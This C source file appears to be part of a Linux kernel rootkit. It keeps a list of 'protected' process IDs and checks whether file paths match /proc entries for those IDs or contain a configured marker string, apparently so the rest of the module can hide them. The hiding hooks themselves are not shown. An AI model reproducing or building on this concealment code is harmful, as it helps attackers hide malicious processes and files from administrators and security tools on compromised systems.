#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>

#include "../../inc/config.h"
#include "procs.h"
#include "util.h"

int* pids = NULL;
int pid_size = 0;

bool check_file(char* path) {
  char procfp[30];
  int i = 0;

  if(NULL == pids)
    goto END;

  for(;i<pid_size; i++){
    snprintf(procfp, sizeof(procfp), "/proc/%d", pids[i]);
    if(eq(path, procfp)) return true;
    snprintf(procfp, sizeof(procfp), "%d", pids[i]);
    if(eq(path, procfp)) return true;
  }

END:
  return contains(path, USUM);
}

void add_pid(int pid){
  if(NULL == pids){
    pids = kmalloc(sizeof(int), GFP_KERNEL);
    pids[pid_size] = pid;
    pid_size++;
    goto END;
  }

  pids = krealloc(pids, sizeof(int)*(pid_size+1), GFP_KERNEL);
  pids[pid_size] = pid;
  pid_size++;

END:
  print("now protecting pid -> %d", pid);
}

bool check_pid(int pid){
  int i = 0;
  if(NULL == pids)
    return false;

  for(;i<pid_size;i++){
    if(pids[i] == pid)
      return true;
  }

  return false;
}


bool check_process(void) {
  return check_pid(get_current()->pid);
}

void clean_pids(void){
  kfree(pids);
}
